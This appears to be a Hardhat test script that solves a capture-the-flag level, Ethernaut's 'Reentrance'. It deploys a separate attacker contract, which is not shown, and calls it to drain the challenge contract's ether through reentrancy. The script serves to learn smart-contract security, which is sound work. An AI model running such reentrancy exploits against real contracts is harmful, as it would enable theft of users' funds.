import { expect } from "chai";
import { Contract, Signer, BigNumber } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel, bigNumberToEther, logEvents } from "./utils";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

before(async () => {
  accounts = await ethers.getSigners();
  [eoa] = accounts;
  const challengeFactory = await ethers.getContractFactory(`Reentrance`);
  const challengeAddress = await createChallenge(
      `0xe6BA07257a9321e755184FB2F995e0600E78c16D`
    , ethers.utils.parseEther("0.001")
  );
  challenge = await challengeFactory.attach(challengeAddress);

  const attackerFactory = await ethers.getContractFactory(`ReentranceAttacker`);
  attacker = await attackerFactory.deploy(challenge.address);
});

it("solves the challenge", async function () {
  let provider: any = eoa.provider;
  const valueToExtract = await provider.getBalance(challenge.address);
  console.log("target contract has", bigNumberToEther(valueToExtract));
  let increment: BigNumber = ethers.utils.parseEther("0.0007");
  tx = await attacker.attack({ value: increment });
  const receipt = await tx.wait();
  logEvents(receipt.events);
});

after(async () => {
  expect(await submitLevel(challenge.address), "level should be solved").to.be.true;
});
